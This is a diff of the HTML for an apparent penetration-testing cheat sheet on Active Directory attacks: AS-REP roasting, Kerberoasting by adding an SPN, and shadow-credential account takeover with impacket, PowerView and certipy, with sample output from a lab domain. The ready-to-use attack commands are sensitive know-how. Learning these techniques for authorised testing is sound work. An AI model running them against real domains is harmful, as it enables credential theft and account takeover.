+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In <span class="nb">local</span> linux machine
+</span></span><span class="line"><span class="cl"><span class="go">impacket-GetNPUsers '<span class="o">&lt;DOMAIN&gt;</span>/<span class="o">&lt;TARGET_USER&gt;</span>' -no-pass -dc-ip <span class="o">&lt;DC&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> impacket-GetNPUsers <span class="s1">'corp.local/user'</span> -no-pass -dc-ip 172.16.1.5
 </span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Getting TGT for user
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span>krb5asrep<span class="nv">$23$user</span>@CORP.LOCAL:642ec7b699 ...<span class="o">[</span>SNIP<span class="o">]</span>... e70950229f
-</span></span></code></pre></div></div></p>
+</span></span></div></pre></div></div></div>
+
+<p></p>
 <hr>
 <h3 id="abuse-2--kerberoasting-by-adding-spn">Abuse #2 : Kerberoasting by Adding SPN</h3>
-<p>
-<button data-tabset="set2" data-tabcontent="tab1" >Windows</button>
+<p class="tabs">
+<button data-tabset="set2" data-tabcontent="tab1" class="active">Windows</button>
 
-<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><h4 id="1-import-powerview">1. Import PowerView</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
-</span></span></span></code></pre></div><h4 id="2-create-a-cred-object-runas-optional">2. Create a Cred Object (runas) [Optional]</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">username</span> <span class="o">=</span> <span class="s1">&#39;&lt;DOMAIN&gt;\&lt;USER&gt;&#39;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">&#39;&lt;PASSWORD&gt;&#39;</span> -AsPlainText -Force
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
-</span></span></code></pre></div><h4 id="3-add-a-spn">3. Add a SPN</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> eg. MSSQLSvc/example.com:1433
-</span></span><span class="line"><span class="cl"><span class="go">setspn -a &#39;&lt;SERVICE&gt;/&lt;TARGET_DOMAIN&gt;:&lt;SERVICE_PORT&gt;&#39; &#39;&lt;DOMAIN&gt;\&lt;TARGET_USER&gt;&#39;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
-</span></span><span class="line"><span class="cl"><span class="go">Get-DomainUser &#39;&lt;TARGET_USER&gt;&#39; | Select serviceprincipalname
-</span></span></span></code></pre></div><h4 id="4-get-the-spn">4. Get the SPN</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-DomainSPNTicket -SPN &#39;&lt;SERVICE&gt;/&lt;TARGET_DOMAIN&gt;:&lt;SERVICE_PORT&gt;&#39; -Credential $Cred
-</span></span></span></code></pre></div></div></p>
+</p><div class="tabset-wrapper" data-tabset-group="set2"><div class="tabcontent active" data-tabset="set2" data-tabcontent="tab1"><h4 id="1-import-powerview">1. Import PowerView</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="2-create-a-cred-object-runas-optional">2. Create a Cred Object (runas) [Optional]</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">username</span> <span class="o">=</span> <span class="s1">'<span class="o">&lt;DOMAIN&gt;</span>\<span class="o">&lt;USER&gt;</span>'</span>
+</span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'<span class="o">&lt;PASSWORD&gt;</span>'</span> -AsPlainText -Force
+</span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
+</span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="3-add-a-spn">3. Add a SPN</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> eg. MSSQLSvc/example.com:1433
+</span></span><span class="line"><span class="cl"><span class="go">setspn -a '<span class="o">&lt;SERVICE&gt;</span>/<span class="o">&lt;TARGET_DOMAIN&gt;</span>:<span class="o">&lt;SERVICE_PORT&gt;</span>' '<span class="o">&lt;DOMAIN&gt;</span>\<span class="o">&lt;TARGET_USER&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
+</span></span><span class="line"><span class="cl"><span class="go">Get-DomainUser '<span class="o">&lt;TARGET_USER&gt;</span>' | Select serviceprincipalname
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="4-get-the-spn">4. Get the SPN</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-DomainSPNTicket -SPN '<span class="o">&lt;SERVICE&gt;</span>/<span class="o">&lt;TARGET_DOMAIN&gt;</span>:<span class="o">&lt;SERVICE_PORT&gt;</span>' -Credential $Cred
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div></div></div><p></p>
 <hr>
 <h3 id="abuse-3-add-shadow-credentials">Abuse #3: Add Shadow Credentials</h3>
-<p>
-<button data-tabset="set3" data-tabcontent="tab1" >Linux</button>
+<p class="tabs">
+<button data-tabset="set3" data-tabcontent="tab1" class="active">Linux</button>
 
-<div class="tabcontent" data-tabset="set3" data-tabcontent="tab1"><h4 id="1-request-a-ticket">1. Request a ticket</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-getTGT &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39; -dc-ip &lt;DC_IP&gt;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc.absolute.htb <span class="o">&amp;&amp;</span> impacket-getTGT <span class="s1">&#39;absolute.htb/m.lovegod&#39;</span>
+</p><div class="tabset-wrapper" data-tabset-group="set3"><div class="tabcontent active" data-tabset="set3" data-tabcontent="tab1"><h4 id="1-request-a-ticket">1. Request a ticket</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o">&lt;DC&gt;</span> &amp;&amp; impacket-getTGT '<span class="o">&lt;DOMAIN&gt;</span>/<span class="o">&lt;USER&gt;</span>' -dc-ip <span class="o">&lt;DC_IP&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc.absolute.htb <span class="o">&amp;&amp;</span> impacket-getTGT <span class="s1">'absolute.htb/m.lovegod'</span>
 </span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Password:
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving ticket in m.lovegod.ccache
-</span></span></span></code></pre></div><h4 id="2-add-shadow-credentials">2. Add Shadow Credentials</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=&lt;USER&gt;.ccache
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>m.lovegod.ccache
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Pre-check <span class="o">(</span>Optional<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="go">certipy-ad find -username &#39;&lt;USER&gt;@&lt;DOMAIN&gt;&#39; -k -target &lt;TARGET_DOMAIN&gt;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> certipy-ad find -username <span class="s1">&#39;m.lovegod@absolute.htb&#39;</span> -k -target dc.absolute.htb
+</span></span></span></div></pre></div><h4 id="2-add-shadow-credentials">2. Add Shadow Credentials</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=<span class="o">&lt;USER&gt;</span>.ccache
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>m.lovegod.ccache
+</span></span></div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Pre-check <span class="o">(</span>Optional<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">certipy-ad find -username '<span class="o">&lt;USER&gt;</span>@<span class="o">&lt;DOMAIN&gt;</span>' -k -target <span class="o">&lt;TARGET_DOMAIN&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad find -username <span class="s1">'m.lovegod@absolute.htb'</span> -k -target dc.absolute.htb
 </span></span><span class="line"><span class="cl"><span class="go">Certipy v4.8.2 - by Oliver Lyak (ly4k)
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Finding certificate templates
@@ -425,59 +412,62 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Finding certificate authorities
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 1 certificate authority
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 11 enabled certificate templates
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to get CA configuration for &#39;absolute-DC-CA&#39; via CSRA
-</span></span></span><span class="line"><span class="cl"><span class="go">[!] Got error while trying to get CA configuration for &#39;absolute-DC-CA&#39; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to get CA configuration for &#39;absolute-DC-CA&#39; via RRP
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got CA configuration for &#39;absolute-DC-CA&#39;
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saved BloodHound data to &#39;20240924045839_Certipy.zip&#39;. Drag and drop the file into the BloodHound GUI from @ly4k
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saved text output to &#39;20240924045839_Certipy.txt&#39;
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saved JSON output to &#39;20240924045839_Certipy.json&#39;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add shadow credentials
-</span></span><span class="line"><span class="cl"><span class="go">certipy-ad shadow auto -username &#39;&lt;USER&gt;@&lt;DOMAIN&gt;&#39; -account &lt;TARGET_USER&gt; -k -target &lt;TARGET_DOMAIN&gt;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> certipy-ad shadow auto -username <span class="s1">&#39;m.lovegod@absolute.htb&#39;</span> -account winrm_user -k -target dc.absolute.htb       
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to get CA configuration for 'absolute-DC-CA' via CSRA
+</span></span></span><span class="line"><span class="cl"><span class="go">[!] Got error while trying to get CA configuration for 'absolute-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to get CA configuration for 'absolute-DC-CA' via RRP
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got CA configuration for 'absolute-DC-CA'
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saved BloodHound data to '20240924045839_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saved text output to '20240924045839_Certipy.txt'
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saved JSON output to '20240924045839_Certipy.json'
+</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add shadow credentials
+</span></span><span class="line"><span class="cl"><span class="go">certipy-ad shadow auto -username '<span class="o">&lt;USER&gt;</span>@<span class="o">&lt;DOMAIN&gt;</span>' -account <span class="o">&lt;TARGET_USER&gt;</span> -k -target <span class="o">&lt;TARGET_DOMAIN&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad shadow auto -username <span class="s1">'m.lovegod@absolute.htb'</span> -account winrm_user -k -target dc.absolute.htb       
 </span></span><span class="line"><span class="cl"><span class="go">Certipy v4.8.2 - by Oliver Lyak (ly4k)
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Targeting user &#39;winrm_user&#39;
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Targeting user 'winrm_user'
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Generating certificate
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate generated
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Generating Key Credential
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Key Credential generated with DeviceID &#39;8b5c2efa-83aa-4f27-d9c7-bc95a9eb1fee&#39;
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Adding Key Credential with device ID &#39;8b5c2efa-83aa-4f27-d9c7-bc95a9eb1fee&#39; to the Key Credentials for &#39;winrm_user&#39;
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully added Key Credential with device ID &#39;8b5c2efa-83aa-4f27-d9c7-bc95a9eb1fee&#39; to the Key Credentials for &#39;winrm_user&#39;
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Authenticating as &#39;winrm_user&#39; with the certificate
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Key Credential generated with DeviceID '8b5c2efa-83aa-4f27-d9c7-bc95a9eb1fee'
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Adding Key Credential with device ID '8b5c2efa-83aa-4f27-d9c7-bc95a9eb1fee' to the Key Credentials for 'winrm_user'
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully added Key Credential with device ID '8b5c2efa-83aa-4f27-d9c7-bc95a9eb1fee' to the Key Credentials for 'winrm_user'
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Authenticating as 'winrm_user' with the certificate
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Using principal: winrm_user@absolute.htb
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to get TGT...
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Got TGT
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saved credential cache to &#39;winrm_user.ccache&#39;
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to retrieve NT hash for &#39;winrm_user&#39;
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Restoring the old Key Credentials for &#39;winrm_user&#39;
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully restored the old Key Credentials for &#39;winrm_user&#39;
